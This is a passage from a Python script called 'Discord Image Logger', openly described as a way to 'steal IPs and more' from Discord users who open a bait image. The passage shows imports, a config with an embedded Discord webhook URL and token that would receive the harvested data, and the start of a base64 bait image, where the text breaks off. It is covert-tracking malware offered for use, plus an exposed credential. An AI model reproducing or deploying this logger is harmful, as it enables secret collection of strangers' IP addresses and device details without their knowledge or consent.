# Discord Image Logger
# By DeKrypt | https://github.com/dekrypted

from http.server import BaseHTTPRequestHandler
from urllib import parse
import traceback, requests, base64, httpagentparser

__app__ = "Discord Image Logger"
__description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
__version__ = "v2.0"
__author__ = "DeKrypt"

config = {
    # BASE CONFIG #
    "webhook": "https://ptb.discord.com/api/webhooks/1115970515274838047/50YK1QVXbK5t1eB-2i71ccZ12VfQeNjYJYMd8O68bKUcQ4itpEDKBVLJ718sdZ6k0O6h",
    "image": "data:image/jpeg;base64,/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEAAkGBxMTEhUUExMWFRUXGR0bGBgYGB0gIBogIB0fHSAgIyAeHiggHx4mICAbITEhJSkrLi4uHSAzODMvNyktLisBCgoKDg0OGxAQGzIlICUtLS0tLi0tLS8vLy0vLS0tLS0vLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0vLS0tLS0tLf/AABEIAOEA4QMBIgACEQEDEQH/xAAcAAACAgMBAQAAAAAAAAAAAAAFBgQHAAIDAQj/xABKEAACAQIEBAQDAwcJBwQCAwABAhEDIQAEEjEFBkFREyJhcTKBkQdCoRQjUrHB0fAVM1NicoKSsuEWJDRzotLxVJOzwmSDF0Nj/8QAGgEAAgMBAQAAAAAAAAAAAAAAAwQBAgUABv/EAEgRAAEDAgQDBQYCBwUECwAAAAECAxEAIQQSMUFRYXETIoGR8AUyobHB0RThMzRCUmKS8SNTcoKyQ9Li4wYVFiQ1VHOis8LD/9oADAMBAAIRAxEAPwCma9SHlTHqLY65avUYwCCYJg9Yv9cQVx0puQQVJBG0b4mTqKsFDNJ05VMTiA6gjEinmlOxxATKsQWlQB3ZQfpMnGmVolzCx7kgD6nEhw0UIdlIymToIMnoNTRcAkHsPwxz04iB9NhUFT5GPqYOJLZtbdfUn90Qfri+YGiBIvJHnPlln4V1am3VSo7kHGgxMp8SJEWI+mn6X/biQmYpN8aR6/8Ai+ISVaqFS8lsHuKnqI+vr4VCp43qCPngpT4ajCVP0M441+FkbEH8MWChQoND8ejG9TKOPun5Y4McWtUTXdHx1pnEZMSqYxIoajXZ1JWbRMWiZ9u34YjFiNjGJTHy6dN1m/6U7W6RiOKLNsDjgSRVz3TE331sdxfcGx6WkQa00lpN56kGD9Zk47rWOsqwFXpIsx9nSNX97646Uch+kfkMT6dMAQAAPb9uKFsKPr506ziltiE+MmQddiI85g3HKbkeA0aqv59EC2o/gCw+L+1v0w/8u8t1MutKrRK1qZgsqiWgiGQ9CIsRH78VsQVAIIvNu3vgvwnmCtSGkOdEg6JIAI2Kxseu2E38I7qlRUOH9a0U4ptZslKCdbWiLixkceHG0UU55oUvGmgDpImBJ03PcSPUdO98KZxZVLj+RzAIzVHQzb1KU2PeB5gbm4BmThX5g4MlOXpvrpXKOR8V4ItaR9f1CWMQls9msESbTYdL/nQ3WC4LC4F980bgixPKxtpS3G8hbjTBEjT97qIn9gx7PrOBOb48qmFUk+th+/AnM8crNsQg/qj9pw2QhJJG9ZzuKJQEE2TMcpvTW2YVfM7BR6nAvO8yUxamC577D9+BeRyIrqwlvGFwWNn/AKt9m+eBLggkGxFjgWeao6haEpXsrQ/TqOHQixBqZneLVam7QP0VsP3n541yhGmOuJPHOF+EmWeCBXoioJ76mQ/Urq/vYEqSLjE6G9LBW9E9OMxv41b+jX6H9+MwaBz8qNbn5V3pZCq1QikYNQHV7bnpN7bY5BpUUsujam+NrS//AGqPf3wZy9MEw0SZG+4i9+1sEstlKWWDVJ1MRYD9Hcf+ThZ8AKt5Vu4XBlaQc2VN8ypuAdkfuzuRrN7WKhVpJQsSHrekFU99w7R02HrgWzSZOJL0GMkLabwNp/UMMvDOE5aCatOtUCjzMpi/YCN4ItP02x3u61iOy6cqE5UjQfcnUwLngNgAAs0ktjChwe5j4MmXamadTXTqLqXUIZCLFWEC4kGYuDgQB9MXFCi1q4AMOmOtOuw7/wAe+GLh3CqbidXuMdq/ClEqJifN8z+6MQpRSJo7OGU4SAdpoJl8+Re4PcYKUeMfpEH3sf3Y55vhIXTaZIHl9Z/0viNU4Ww2+n+u2Lh1KhequYd9sxE0coZqm33oPr/EY3ekOonCm8qSDIIx2ocRqJ1kYtloIc40fGTQ/d+mN/5OHQnHPIZouupl0p+mTAP13+WJJzagxdv7CMf2YoXkI1V9flTTfs/EPRkRrpMCRxE6jmK9p5RB0n3xvUGN6lVBbVftb9pxpV2kKW9Bv+N8cMS0r9rztRFeysY3q3PQhXwSSa1C46BcL2Z41UmFAX3F/wAf3YGZnOO3xOx9Jt9NsGzhNKB0U1ZjPU0PmcewufoMDq/HkHwqT72/ecBaOUd9oA7mw/ecdxwsiJkyY7YGrExRUpdXdKa9zPG6jbHSP6tvx3xO4RzbmaKPTWGR/iDKGB9b3B9Qcd8ny5VY6koswHUKbfPBrI8uKUDFbkm3uTH4YCr+2ssT1oobfZ7wVB9R6ikxsw7MzNYN8YAH4Db1/dhh5W4O1dguWqCqd6lGosSPQXv7T89sQuZ6CU38NYnrHT0xG4Nlq/mq0Tp0CdX7gLk+gxDrZKISYq+GxhZczLueMmReTEEAydRvcWBNdOZeCNljaTTYklSPhKnb8d8CK2TJOpUZaRPlLbfNtt7Ysbl3melXDUuIxBsKvxS39ZSesXEzItF8HavK+RqUalPLZqmbaiq+XXHxBT97aI3wiMUts5XBcb8acODw70rQYTsAk908M0d1MkyJASbjugE1hzlnXZsvRawy+WooB2LItRvnLR8sCeH0dTidhf6bfjgtzdkqozNWo6wrsWWLgDoJ9BA6Yi8FHxG3TGm0Q4Qdaxiwttzs1pgjY0Z0DuPpj3Gnjr+jjMPUe9SfC0EOGtDj/CVH/fiLXrkal7gERtGx/j1xtREKRe9/niPo7/Eu37fkcL9mSOetGdfKhCLcvC/mb0OpyralP8fuxZXJHB2zLqjlhTgEiABG5iJgkmPnhNp5FSrNICgEknoNr/O2DvK3FSrplQYpu7a2m76Zs1rqIjT69cL4lokDLr6/pS7OKDU/fSbT5GfCuH2mIKudbw0ZmpqquKVwCZY/dJNiLxEz2jCTRqzY4+mqOXFDLq1A00VBcsiCbDyz0YD0v3JxRPO2WX8udkiH0sY7kX+u/wA8WQkgRwj16mkg73p2Pr1pQzhmcNI91w45RkrDVSILD4ltP0PUdP4hNFPEiguL5ARBp9pwtnMmncZRmuytO4sYBGJOYNaoAgHlHdIA+ZEn8f24U8vVqf0lQezt+/ElajkEF3Mg31tIMGCDMyP34t+GMG5PKjue01ERlE8fX1muPHOF0x1E/rPy64JcjfZ3VzbayAtNTBdhIUjcKuzuNv0V6yRAk/ZrwGtnmgvUFJWbxKmppWFQqq3+Ikn5Ak9AXH7NeZcxXp18lXenl6mV0KrLTCjSrFGUrIAuoFos1oN8BWc1qRQ4G+8B3tjrHONCrgTpwzQUtPBvs/yWXIcoa1T+kqnU37h7AAemCmc5by1VPDq09dPqklVPuqwp+YxBo0qiuNfEA4ZtKKAoMnzRIN4AYe3tOJeWylcoyjOajMBwikghvMCJINrdIvioEaUJalLJKjM3vf560OzP2bcKddJyVIeqgg/UGcJfG/sgqUxq4fmW/wCRmPMp9A8W9iL9xiyKmSrkrpzUW20Ahvik7zsV6mNA7meHDUraaiLnadaoF0g6AfDYE3ZVcE7wRI2G15ggGxqWnVtKzIJB5GPlXzpm0IqnL5uiaVZbGm5j/A/ruFkqbQcR8lwRBUiowjpNtX1+Ejthh57zmazGa8LPmnoWq1JK4pFFUqblXu0CQWUlgPxxGFI6Wo1RFQAU2DqDLgGSDudtQPaItEDA7K493hw6evGtVOIGOIbcTLuiVCBPJWnhG50EkK71ODhYKKSvULePX2P8bmOuXyaGAYsZ398JivVpkqHdCOisw/UcT6HGMyotXqR7z+ucNoSnNmiasxjC0MpTp4Hxt9PPZ6oU6zBadMsAxALSRv2HU/KP1GBx3jYy00aaMa0RBB8u4/Ydu2F7Iccq06qVqlSowpnUBqNyNrbbxeMbZvMZ/P1kdaZeowgaAB5bne0CPvE9u+DOLJMx+QoL+LUtV/CPXDczS+tNqtVVLeeo4WW6FjEn0E4tbkbkDMZfNFqjA0kTVTaDpZjaCBMEWP8A4wq8y8i5jL0RmKyq9IQHak0tTmB5hswB6id8P/L32iUhTak9OrNOmXnxNetVA2cwxJtYgXO+E3TmunxpVKJk0q/bdlVSrTOhUqPTPiFYhypUqY3t5xJuQB2GETk9IrVK2kFaFGpUIYSJ06UB/wD2MmCfP3M44hmjVKMtMJopLIBHXU1iJJmw6QJtiXyTlyaFSk2immaqLSNRmiAkMRtAWXQkz0OOCUoR37Aa1QNqWsZPenpHiRbl9yBWPzLUzmWejUVRHmDwovaeliQInbqfUHVoCnKgfCb3v88MXE+UGyxIDB1BMlTIM3sQT0wOamH/ADenzBfzbHcET5JP3SJjsflHYbskIzte7vxHrea2eyU9lbds5HdNoV/Da2uh3Njxod+UemMxr4L/ANG/+BsZh/tE8aT7Fz90+R+1Z+UENY4OcFyDZqoEUherE9B16e9sLAb1nDx9nOaUO6mAxFp7WtiEqpF90hJUnWhefiq6ZemCtFqkFzu3TUdgO4HTri0OXeWctlWoMKbVqlUBlqKoKgwoJksAJIvEnznuMVxzHl/yYhtOr89AXusqwH+Ex88XhkuLolEglFrUqbEIRLKAsliF2X6A974QfKgZNCYUCm2vPXn+Zpf4rz1lqOWqaKjO4rnLmktPSFaSDJI/RViCCZIG8HCdQ4e2fzbVKaCqYnSR5QBCw1xeD3Fwe2E/iGtvDrFvMX1OdgXYlmO8ap1XHyjFwci1nOQrDLv4mcsDLqXFwsy8iVBMagRYW6YvnUQb61CWkIIVE5bAbcb77cRSpxvkijlqn592pK41IJBI2ldWxKm3tpJ3wq5rIim5VWDrurDYj+Le4OLtz/Kbvw2nQr1BVr03FTxXlvMahZrm5GlmXpaNulXcU4HUNat+TKj0ljTpYWMAnTJAK6i1x6bYCHeyX3jan20h1ECyh5evtQqjSx3KRPorH6KTic3D3pwHUqSJEiJHcdxjnmaI0MCdMiNQYDe0eYESZjve2N1IBazDhWUsnNFPX2AVl/IcwswVzBY+xpU4P/SfphW4EjZp+O5/ytSGXzCrKgq5I1Ie0qlND/fBwUXlLhuWpkfl+cmq1FHoJUWmz63CgMmhWKXa56aow1UP5Jp0jwqmai+ISrUUFfxDqsxcxrCEbs0Lp9IxjUaof2c8u5dcvlKr0aQ0Uqb03ABdnqhw5JAmDrC6JIXSNsD8zQXh3Fvy8I3gVzWoVtCkhH8hQwP0yFX39Th24XydlMv4ZQVYoyaerMViqTM+Uvo6np+rA8VuG0MrSruagy+YqU64eq1aoA9nRmZi2i4XcgTAx1dVbcyZFsjT4y9IxVZssruu6eKpqVdJF1DO0R20jDl9oIXK0+GVMpCVUzFKlRVBepTYQ1O26mFn5dcF8vR4X4vWo+fQNFRq9Ra6bizlk0rNrDSCNgcRDU4IlRgaqrURWWGrVtVAQA2gFpoWgEpptjq6iFPgNDO5LMUasMtTMZghhEowrOoZT0YEfrBsSMUPza+ZyzeBmINTK1KaBgL1E01CpPcaIAO8QDcHFj5Pminw56OWyeVRlzi0qlFzXqqhFRyo1LU1lGsJImZE7YCfaNVrZjOLSzeWp0W0KRDayyJrJ01AQDLTIKKwUH9K8KIAJNFYSpTqUoMEkAHgSbfGlfjXCndfyhEJpiFZh0JuJ9LxPthxzHLAyfDqlGoTVrZgq4CIWFPQRLSBYAEyTEyAMAMrQqGkuWQuyMVBVRJbTdem/t29MWxWilS8PWVpin4akmWkLpGwlmjt2+eM9eIW0GEgFWZcAJFyEmZJgkBPvKCRcAXAmtr2kicWs2GhPUpBj1rtVP1OG00dvK1bLB6ZZisM1NXDPC94HzAPfD3yrkDXrZvwCKfhgLSaGAYMgIYRB06gNumBebrJl6eqoD2A72k/IDc9MF8lzWqVaC0KLeLVRNS6TFOwOltWmbX1Kbaeux2MUsI9xUyL6EWjXbrSqmU/smT69eFFObqn5PkHp1B4jVqbK7SSAWGkAEnUQC0AsZgE3OKkzlCnS0hDIAAcmGjYggGLiNp6DFhc5nM5kqTSIy9JtTBWmTBGs7MVA1RAtJJwjvRUtAESdyJgYvhEIyFRInkQR0tYHjUoYIST6+FqEZfgNTNVwKIletUqVX39TPQYmc05B8poyrGGRZOlpDB2LEzpUyYCxGy7nFj5fhVehl10FVanI1FQdqlQmFMCYCRJ+/JgLioeJcefMVWquIeoZJ39IvsOlgMBQoLVY2pVYSk0+fZzWpVGdMzUKhkKqTETIIJnoN5H1wL584QtCoTSBNOZSoPvDoQRIPv/AOMJwqEGQTPecE8vx+p4TUWIZWPxN92cDXh1Ic7VF5Nxy0PlqLeJ0LzeKStPZuE6a63Gh4ydNY6RUj/aU/o49xB/k2v/AEdT/En/AH4zFuywvEef51o/jfbHBf8AIf8AdoJTw98iZan4dWpUiAQCT0gT+0fQYQqZwd4ZnCtNkJ8l3I7sqnT+MCPbDTYtXk3ZUmBUvjXMbPmZpqCtNho1KCBHw2IuTvB/ZiHR4xWU1WFQ/nrVf/8AQDoe49NvTAAVmJEAkyT3kmw/ZhuPK5iGrLTIokjUwGqqNUU1n4jaDEwRGFVuD9qjstROQaRe3hUzl7j9JsxRGcVTSUQBACgySNUfd1HUT29LYdcs1LK8SlGRlJ8SUXyrMi0G9iSAZAsfXFTUVELPUH8AP34d/s7z+WXxkrgvUZQtJTsN5A/RMkGew+pEBIMGrLVCDadNNeHwmfVrjz/MOWIWk1T4xJY2EA3vESdoGE3MeCmadKbeLQeHCTbVHmW4vIXUBtJjtDBwXhoCqKraokKhtv8Ar/XjOPcHpCkbKqgiGK3Q6gd9/b/XCzzKVHf5/D7VcKDYISa5cS8KtSIOk09I0MBdG0yI91/VBmcV7zvwStR8FqEuUC1HWASGIIggfowbbw57ThlJqUBTMhkZjKAiCZLK1geok9bEdcdavDKn5VRrKjOrUD43hmdBVw1JwDd21NUkDdSYFr2bdWkFKTb4Tx+VBKLAqEGuHBuYeH8XbJpWmhmstUp1KeoqRU0lZRXtqDEKdJAMiwMYN5KjSHMVdi6+I2TTSJvdgGEdwEU+zYUuJZXL8R4hlDlKRoZhaofMs6+HAQq8FTBap5TBAuNzaz1xNOEZfMqlXLZZKrgv4hoJAI7vpgMbm52B9J6aHHCpnG+Nq9CotJKlYvVbLRSNPUGuHjxHVZADRPUdsLX2aClUyua4VXQqaL1FNJ41+FUJZSxBKlrkEqTHl7gloy/C+Gs4CUMrqoVNKxTQaKnxQto1TJtcEHqDjyny5w7x6lQU6XjMG8WHMsGPm1jVcExYiLDsMTXUsfZBTZvygVagqnJO2Tom0CmpksP7ZC37U0HTHDg+W18W4qwdVK1ctrJ+IUgFZgOgVioDzYqDbDpw/hWQylVVo0aFCtUDBQiqruBdtrlRYnoLYg1eBcKpuarpQD1W0lmedbEiBdvM0gW3kY6opK55Vf5X4UaNFKqhSKdIsFVvDZtMNBAAMMDHQd8K/NfNj57N0Khy5paGegqlpKsY16jAGroFAtBuThp551UM9la6pl6VPJCKeWFQ+JUBMALTp020ggW9iehwnrQzFfNNm/B0l6pqihUXQX8+lWWVMTKjVaW1dJGKOzkMawfX57UfDEh5BAmCDHQz9Op0F7U6cicIMDM6isPpiAQ6wNQ+dhI20nDJxcf7uwCsayKSoiZN+kg9iepAMTgdkar0QKaoRo6apjoYPvN/bHSjkBRVnWu5KtqN2uLCGBIBHsLe04wcJiEvYm6wgjugEAkiZN7H3gYF8smZkA63tKStboE5jIg8LJ47Rwmqyq8s1qtUvmazeNchGWNS2ssyo6+WOmGjgqDL63WmjVLIhRdR0yQ5JF22HtBwz8ZrtWRSKK6FMs3UbWMi17/IXF8CcpTU1F+IwwIKmI+cfL2npjSxzy2yWyPXr0aBhChaAsaercudTEUoxevX0M3lAQ/d0wLEWjcGO84i5Tl/LtWFRW1otysAAaQN5O15/ux7zON5SroqVKAJquGhwFYKANoLLuJMgzPcWx5lc7qyn5RmFWjWpGGIm7DaLT5pA03IJIvvjPR2wRnSq529eInXWjFwEyLbW06eVuNDuN5mtmvEArLToFCE0jVIYEM5Nr6ZAg+WTN8U/wAZ4d4NdqV5Q+bUIIPYjvtPrO4ubV5hzAXLlWYavzjEloLQwJHWSTp8vUTthJz/AC3W8IVm1vWqEs43mQCB+kahJNo7Xm2NXBPggA2FVxDMoEDTU+Pqevkt0aLOwVRJJgD+PrglnOWcxTpGswGkGDE2+exnf2vhi+ybJJUzyq4+A3BFpF4PraIxbPO3B0bLV6tQsXEkCbEfCqxtsYneeuDYnEupJKNExPPc/MVXDs4Y5UOzmXoRtfKLRe4M68IJmPm/xW7n6nHuOX5Qn6R+n+mMwbOP3flSHbfx/Go9M4KJlR4BdxIE6RJkmDBAHQGCfQYEU8MPCuIOtN6Nij7gzabGIPUdMHSlSkwnXnQW1IBlen12kbj1yJT7N+F+IyVBoHh1UNXXqPlAYggD0Nt7icXu/LmWGqqtBDVglSQJkCwE7CwgbDfqcfPXDOKVMhW8ZBr1MRUTuqgfQgzBxbeU+0HLJlg9P42jUag0hJ/SJ+I/1VJJO5G+EFoWFW9dfl0pkKCmwEnTb6/fnVbfaPy0OHnKIG1O9EioempWBJH1j5DGvKeaWnU+LSSwDkiwUeYHvqsB69cHueM7Sz9JPCRndGLNWbygAja9yT5fKAPoMRuAcorUdYrMRbUQoX5CSZPrHrjlOloSrUVZKZX19GKuDl7jy5qUSmxCjzMbL6C95PbBLNZPXIsbXUD6Tqlf+nCdy7kWytQKtUBGMNYE+k2sTbD3QAE+uJaeC05gaG8gIVbSkzN8pgOuk6SSSNiBvNo2vsIxFz1Kvlgaa1mqk/8A9dOA8tZblWCgtAk2EkmwMEftA4q+WQ1FbTK6VjdmJMx2AFyfYWkYVeEcVo1vEphi1RgdaiXKpodi0LOuoVVgqCTqIm2CEkm9XB/s8yjXLI5euSK+Up1/GZEA/MhEDEzDuaQBRNJNwCRUUiL465/jlGug8zeO1RULnZXzCfnahpxqmhSU0gWJAKbeU4k06dCsWXW6EgURTqeOVFSoD4QZT5qhENVZ9KqppoFIAZjwy+SyztVzBp+PVqtFP4w1VaZK1KoZWGg1H8QhV1E0qR0o18VoUyZNScpWoVPzlQxS16AwY6stTVGOXKmf56tGvXdj4qr96/ROF6ai66NHxmIV6TUy70qMDTSoU0AEGSDmCwAIMmR5fKmXVaAFQP4VYF6lcVY0lRpQ00Gpqtf82jgQVSFCkQMExn69QF3q1KdRaVLxaat5SKk6aSx8Nct4eqoJgVSBsCOiqE8KE5fMK2UpMtMOVKrqsyqqoV8LSlRQxp02uHIpa3qTFhjw5uhQoBqbhfFhhVK0/D1VKlMhSVYTo8QVX0CCQYIFNVEfI5CnSq02pUxqXVmS9JDZag8KnSpC+kFXFR2M6dQJvESGy4NFqmkNT8YCmsqtOk6ks1RVrupLSdGqdTM1RiIAAirwK71+M0kGqrRDBWrshqg66kUwY0ffqVGQNLAKohVEr5duE0lfLpUp1UfQVXWlwzsivUII2VYSkq/dFM98BuMKKVGkaNGrVzbgPTdabnSrjTAYHQWdJcrDyzDspwWzGVDkAoEQhai02VxWJeQBVJeVMqxKKAD5TJAK4Uxh/wC7rzHLa5AkjppJphoJD4DfeuQJtPPeJ16c5rsX0z+JnvhmfhQWg14dlgsbj2g9CdzjXJ8tCFasxNh5AI26E/ujErjKeIPC1KqiPEn7okaR2knGRgPZxYCnXRf9njvtcAkcyQJ8WsRiUulKUG2qjtaPP5EwKXs/kvDosFqNUZh5hbQw/RF5FpvJNvoKWtopgogI1SFiCjL0aY7zvePcBqrVcnTmm9empEgqzCbCTY/sF8L/AB2rlaH56lUFQW1oGlWmwgjZh6bD6HXShx9EOwP3Te3I6yCP5TfSkEuBDkpBMm448xwPzo9wSqlTUyIRtvsTGw+UY85hoJUpwQCVaRqBgNsu1iZPe2FjKce81Dw0emcwTpdSrKCtiGUn02sYuD1wVqcRNSdbqGpyDoBALxpmCSYk9zEfPCCkLZbuOVNKSFOnL85peTJLXzChpFKnJqKQYJmUW9yS0sZ7Cd8EeYcutCmaobUiqWI7QJ3/AGjDPwnhqIkzrJlixvJJ3gWmImMLPPnF6NFKlFrvUpNa1gQQCSbzMwB2wrh8VmeCUX9X+PwgUf8AFqLoDemkfXw1vEAQedXBsxSH+7gs6DXV0As07sxgGFW0k91+czlLnGr+UDx2NWi8LUpsSQVkGQJswNwR7dcDeNcxNoOXpJ4YBOt/vMdRnTHwjcdyOwthapllAcAwDE+u8Y9EMMhbXeAk71XH4pQxRSmcif2YIgJtbha8wL+Z+i/9mOGf0lL6rjMUx/tIMZjH/A4im/xTX/mF/D70oUzgnk6gFztgUmDfCcvI1/1gB84k/IHHqEOZL15xpouqyj0KziOZdYJUea17k+/bBblSi1Y0lqAuqu1Qro2IB0EsSBEkmMcPB8bMCl0ER+JJ+UfhiyOBcNURSpQCQZY/xdsZ2LxHZojcjyHrTn0rSaw6S4Sn3U26kf0vytvYNXy1as58q06Sk6KYIlje50ggd7Hr88NPDcw7qKS0xSUbgbAfpEncm0CffbBnh3DVC6YhhAZXAg9jIEgHoR22xKrZNTAurD4TN/UTf6GQRf2zO1KhBFh8OfXrRHQjNKZnnvw2+AtxBrjSyiqFCo528xPY/TBniXMdCjsRVqdEQyfmdhgBT4qdLpUrrTKbswUW2EbXkdvniDkMmmmVIafvCCPwxLTqmyRxi/q3lU/h0uGXDpsN55/bzoLzXxmhVIr5pqg02FMC09gALydyWX5RhcHNGSpZYVKaMJbT4CtTDEyTraQTEBbnUZIg7xF+0HNg1PDH3SWPqTYfhJ/vYRayA4eSnOBm66n6VR5wtT2drRoD5SDHo63q1a2cVKAzJoVFUKG1UjQ1U5mIYHoWOw2ZhFzO3KXGcvWXwqJemQZCk6wBIIC6jqAVvMIYkE4p40hjpkc89CoroxBUyDhhtpoAoUJB5qkdDmnw05Cs9zFulWZMSBulMHqAkDzBPOr0zdBKDGpmMwKaySXUEs0Dct1JidJJYxEYg5GstVFq5Vg1JWKp5WUpEdH6/M9gbYAcx8wnM5enRsuqmHYEXUx1jZQTvuT0thdXJUU0oW1E3sb+83CD1wB/BM3QhSuapN7eW/DjM1q4Z/GKhxaEAR7pSBHCN5MJJvtsbC2eH8JasSpCoi3aUBHmGmwiDIETMEDEnhvDabKzZVlGhyBCgBmBkwwNgT029hirMrnHygZFzDpTdY0M8iN7KYH4dThr5K5yoZWktJ1d1LM3iCDJY/oySegsZN7Yo1gmezKHFKM75lDpvHUmZpbFu45Cu0aSkRHcCUm37RJIBubAAzBJvTvwzgKlYq09JACpBRtI9yGJ6bm/44KZDgCIQxJYg6gICgHvA3PqTiXwfNCsodUqKp28RCpP90+b6gYJFYE4heFbTAuqNyZ3meEjYxIoCMY4uTZM7ACw4DUgHe970rc98X8KgaQBZ6wKSCZUEb/x3GE9qOarZcBa7FCdNRT1MQZbdhEbn8cd+L12zNclgBcrANoBIn5+vTB3gXCWpMSXBVgJWOvQ7kd5727YaSgJR3tdarmsQNDQLK8mSD4rTOxEz+PTGvEOS10HSxmIv17T298N/FOIpSCglSzEwpMTEEwYgbi5IEkXxxyWbSspKypHlZT0P8TGOk1ANKHBOH0XOmuGFJAJiZVrqT7EAA/+DjRMqtLM1Vmn4WoMELgOdVyV1m9tIib274m8SzBoVS4E0iAtWImCx8wn+DIHriC3K9XNeJROkLqVqbPOtEvYkDzCxhT1E+7Cm0KZzHb7n7EeHKSIPOpxBM6/YTpyPx8KM8Z4I6qXoM0RJCsQGB2YfOR9QehxVeaVnaqWk3i5/rMPf4VT/pwzcc4FmMiRQOazHhQSmmoyKQ3xDSrWvus9j1x04By5opU8zUAqUmaosC7yJIVp3U6ZkXvEQLoqIT3hW1hMWQ2UOGRt8o+3DTcQi52jUqaT4ZFghcwA7dwTaPXoTiRm3K0atGvSNJwtMAMCCex/6TfY2w4cXyrvmKrpTaoAigqiiABIhAYkAEGOp1GN8CftA4cUo5eQQyqKVQuRLFQDa8uoOoaoGxxVC85SmI4crg/lpR3nVNJLpXJcSoKTA0ylKekzI0neaQZxmN9OMxpV5mOdduGZVG1NUJCqJP4frnDDkksGYaFElE9ADc9zMYH06IR9FNfEcH4mFgfRdhHcziXxGkKdGozNqqGE1E/pduwscCmTW2wgNImNNfnruQNvE1I5WXVX8YNMKbdy3T30lvqMWhyyg8QdIkD12H6iT8sUnwPiXgA6tQANlAG/Unr2j54sTgfGfzqstVSo3AIIO9jE/XGfjW1rWTtFq7ClKmSAb79dPt5VaFCsCstFxB9CLNH0nHHNVwtL4gSD5T3PQ+4/UPXCwlFqwcrqUF9REMQpNwYF7+g6YPHg6JSFR2fRBLSuljYkwCZWw63wFLCorihCTc+FAaWRXMNqaxk39+38dBgPzjWbIOq0UYMyai5OwkgWAvtMkxthz4BQWtS8RYXUfEX07D5bRgJ9ptOEpVibLqRvSwIH4H6+uJaGZy+lwPCdfGjKd7+Sbb1T2frs7FnYsx3JwM0Fmhbk4n56vqJIAHoMNv2ZUaLtUlfzyAFSeqmxI9QbH3Hrh5tN4rM9pYjsmlLiYpG4pkKtAgVFiRN8duBZSnUdfE2DoSJ3UmCPrp+tr4sL7ROHB6CxAOuxI/qm1u8D8MVq1ZURlBViQBIEwOtyLTYWwUiDArM9nYjtUBxSRuDw0/MGi9RSzPTcXNZmqleqU01gDsNIMfLEPJFmdqggO58pPwoB1+VgvsT0wV5d5fzDhahIURAVpkqQVg9hDGPfBnL/AGXZllkOOkBgQPfv+GBlYNhXoClchwpga3IB0tzm6jtczSdVFBHku9U97QT3JeZ+lu5wycNzBYSsr/8AsVvrB2/DEPjfBquSbSXosbyaR1FYMQxgFTPTEOhxCsb6Q6gifOwO/dagI99u+ImbVKFBvUWN4A+pkn4DhVl8u8c4nXqJlKNTyn4n0A+GgIDHVECAYA3kgCMW3xCp4aALuYVffv8AIAt8sfM3j1ab6A1S410qisVcDaCZBDKZX9l8MWT+0jOUfDDs2bCNqPiBVI8rLAZQT96ZadtsEjNrSGJCUGQAE+V5v18LdKfM/kTTqEkkyZ1HczvN+/XucHOF1NSEXYjud8DeUvtH4dm2CF/BrEwEqwJJtCt8JJ2AkE9sOmY4XSf4kE/pCzD2YQR9cQok1QuJ0AqveYa2h5q0a1ZB5h4OnVsBsSJFrkbWMGfLF5Mz7VqWaraIPjEBBJIB8yr7gvHtGG/OV2osyFHcKJ16TEH+sF06u4n1sIwPpcy0ms5NMsSBOwAUmSdhO3vbHdopSQk6DSp7IA5wNfXhSJxjJ13zdE1QQCIIBgEFhKtp3AgGDO47YfeA1/BbTVaUqaVR+xBMBj6yAG9QDvJD5niquS0eUCVtcjaY3AMwNp83TE7J0y+XVCkAiSOvmFx0iNsUdJSPmOlNjC90Zhe/UW/pb6i3H7QddamUpoGFFxrIPmUkTZJ20tJm5n0ulcK5rzFKkKaBTRDElHUS17gMGMDfpv6YaOEa6NZjeYKus/zgmzH+tEmTeWIPXAXmfh+Wp5mFdlVl1wqzdiTpAkeZoJ9I9cSUhItSreZasgSZ4AXt9qPcS5v/AN0zGYRNVNCioGEEloW99tU+sYorNVGd2djqdiSSdySZP44trmNaQ4VmPBEIWy/ffylt73aTio6hv8+mJw6EpBIFVdOxrlOMx2/I6v8ARP8A4D+7HmGMw41T8M/+4r+U/anCjSSmvl63nqfnhd4/nJUoOrL84DT9JGJGVr1HVKSAsRC+USzHsv7ztviweA8hVETXm0pw0AKPMaa26mOtzHXA5ANzWo852jWVG49etTsKqbwdKaqm/QfvxYfJnAGpAK8ioxDNH3bWHy/Xjnzfy2mSziUQdatpb1ALRH4YceW6RJZonb5fxbC3tB0oACetDwLQ7zh6Dx3miVLmQ5Qf7yDoJ/nFUt9QASCenSeuAvNPN7ZhlSj/ADJUywmT3EdDt+EdZI840x+SuyiTphgTEDUL+sWaPcdcV3wbggV9VNmSbNJlb7TqB+s4ozLiLm/L16+AOlIDgXFt7+vnVl8rp4GlarQ9eCtPsACdR7FtgPT6JP2tczJUq/ktFgVQzWYbFxYKP7IJk94H3cTq61aWjUdTsRpZJJ8txA3GwvtbHnDuT8uSTmqLKzMWLmQvmMwdMAAT2tgqcOM5OnX1rUOpJIWDM8PtVa5LKmq4Ubbk9hg/yXmdPFFVR5Ien8gpP+ZcNfMXJjZAMaKl0f4YudRsq+0kQfXEGhybUy+SNUGKulnld5A794m3T3GLtpIX0pfFsJdw2UH3gfqB5EyenSgvP3MK1KvgqfzSMNTD7zA9/wBFb+5wtcOpq7LRK+apXUyd9An9cnG/GOEVqCZerVp6aVdS9IyPOFjoNt136MMbcoIr5pWcm3mHq0gR9CbemJUqxVWdgsOhlSWkac9+PifjYbCrr5NyKh2DwXADILXU2m3UG3pbvhk41xOnlafiVAxEgQok3+YA+uKsThtXL8RXQXCrVMKqtBoEKfE1g6SHkjTEi3oQ+8z8RpKQlfKvX8xKgRoEGATJmSIuFMSdhOAkFHdFaalFxwKUDB23jlPWknL5gpXOcOWmgXaxXy+abAkRq9ffClxagq5rxVpFKNQVHVSQRpgq62iwM26CPc21wLmSjm28MlKZWyUQikQPVgQfZdP7q/8AtUprTzi0qRJL05KDZWqHT5R01AC3tiiARTTjyVKGdMERuTYGwvaee+kb0BqZOpU0KKn5yixWSfiV9LKT3lY2GNOP8FqClqBnSPMFsGA+97gbj0nA7MUkFSWdyZKnoPIdMbySABbsRh5yGUp06Y0EsG8+pyCTP+mNBpAUDXmfa+JLRSseViLczoY89ZqqdOPpL7IedXzuWNKp5sxQABYm7obKx7tYg+wP3sUkvAVqV6nh1FFJW6XIJvpHS3fDjyjlaNDMUggZZYAsrEMdR0xqBFpIMWHlxBZJFDTjms6U6kx4Tx0vV7HMorHUwU/eBO3UX2HUwcA+YeX6eZGqloLkgE9CJEkx95dweuxmcSeG8WphVVmCtYHUbk6QWJPU2iPTEitxRVJ003qdTo0mD2uwv7YVKa0xnQqRauOV5ao056sd2IH4DYe8T6458Yzy5akfDXU5sB1J7e/6h